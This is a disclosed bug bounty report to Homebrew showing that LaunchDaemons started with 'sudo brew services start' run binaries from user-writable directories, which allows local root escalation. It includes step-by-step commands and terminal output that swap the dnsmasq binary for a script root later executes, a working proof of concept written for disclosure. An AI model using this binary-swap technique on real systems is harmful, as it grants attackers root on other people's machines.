# Homebrew installed LaunchDaemons create simple root esclations

## Report Details
- **Report ID**: 586251
- **URL**: https://hackerone.com/reports/586251
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-05-20T19:34:49.683Z
- **Disclosed**: 2019-05-24T16:36:52.595Z

## Reporter
- **Username**: keeleysam
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: homebrew

## Vulnerability Information
Many programs installed via Homebrew require services to function as expected - most of the time these are LaunchAgents but sometimes they need to run as root via LaunchDaemons to function properly.  While Homebrew attempts to secure the executables run by the LaunchDaemons that it installs, any other program running as the user can easily swap out the program for a simple root escalation.

Reproduction steps:
- In this case, we'll be looking at dnsmasq, but there are many others 

1. Install macOS Mojave 10.14.5, create an account and login.
2. Install homebrew with the instructions on brew.sh.
3. Run `brew install dnsmasq` - brew will tell the user to run `sudo brew services start dnsmasq`
4. Run `sudo brew services start dnsmasq` as prompted.

```
samuels-Mac:~ samuel$ sudo brew services start dnsmasq
Password:
==> Tapping homebrew/services
Cloning into '/usr/local/Homebrew/Library/Taps/homebrew/homebrew-services'...
remote: Enumerating objects: 17, done.
remote: Counting objects: 100% (17/17), done.
remote: Compressing objects: 100% (14/14), done.
remote: Total 17 (delta 0), reused 12 (delta 0), pack-reused 0
Unpacking objects: 100% (17/17), done.
Tapped 1 command (50 files, 62.6KB).
==> Successfully started `dnsmasq` (label: homebrew.mxcl.dnsmasq)
```
5. We'll find a new LaunchDaemon has been created:

```
samuels-Mac:~ samuel$ cat /Library/LaunchDaemons/homebrew.mxcl.dnsmasq.plist 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
  <dict>
    <key>Label</key>
    <string>homebrew.mxcl.dnsmasq</string>
    <key>ProgramArguments</key>
    <array>
      <string>/usr/local/opt/dnsmasq/sbin/dnsmasq</string>
      <string>--keep-in-foreground</string>
      <string>-C</string>
      <string>/usr/local/etc/dnsmasq.conf</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
  </dict>
</plist>
```

6. If we look at the folder `/usr/local/opt/dnsmasq/sbin` we can see that our user doesn't have write permissions on the `/usr/local/opt/dnsmasq/sbin/dnsmasq` program which the LaunchDaemon runs.  

```
samuels-Mac:~ samuel$ ls -lah /usr/local/opt/dnsmasq/sbin
total 560
drwxr-xr-x   3 samuel  staff    96B Oct 18  2018 .
drwxr-xr-x  10 samuel  staff   320B May 20 12:24 ..
-r-xr-xr-x   1 samuel  staff   279K Oct 18  2018 dnsmasq
samuels-Mac:~ samuel$ echo "" >> /usr/local/opt/dnsmasq/sbin/dnsmasq 
-bash: /usr/local/opt/dnsmasq/sbin/dnsmasq: Permission denied
```

7. However, because our user _does_ have write permissions on the `/usr/local/opt/dnsmasq/sbin` directory, an attacker can move `/usr/local/opt/dnsmasq/sbin/dnsmasq` to the side and replace it with a different executable:

```
samuels-Mac:~ samuel$ cat /tmp/evil.sh 
#!/bin/sh

touch /Library/evil

exit 0

samuels-Mac:~ samuel$ ls -lah /tmp/evil.sh 
-rwxr-xr-x  1 samuel  wheel    40B May 20 12:30 /tmp/evil.sh
samuels-Mac:~ samuel$ mv /usr/local/opt/dnsmasq/sbin/dnsmasq /usr/local/opt/dnsmasq/sbin/dnsmasq.bak
samuels-Mac:~ samuel$ mv /tmp/evil.sh /usr/local/opt/dnsmasq/sbin/dnsmasq
samuels-Mac:~ samuel$ ls -lah /usr/local/opt/dnsmasq/sbin/
total 568
drwxr-xr-x   4 samuel  staff   128B May 20 12:31 .
drwxr-xr-x  10 samuel  staff   320B May 20 12:24 ..
-rwxr-xr-x   1 samuel  wheel    40B May 20 12:30 dnsmasq
-r-xr-xr-x   1 samuel  staff   279K Oct 18  2018 dnsmasq.bak
samuels-Mac:~ samuel$ ls -lah /Library/evil
ls: /Library/evil: No such file or directory
```

8. Once the service relaunches for any reason (reboot of the Mac is most likely), root will execute the malicious executable.

```
samuels-Mac:~ samuel$ ls -lah /Library/evil 
-rw-r--r--  1 root  wheel     0B May 20 12:34 /Library/evil
```

## Impact

Any homebrew formula which prompts users to run `sudo brew services start` opens up this vulnerability.  

Once this is opened up, any attacker who can run code as the user can easily escalate to root.

## Attachments
No attachments
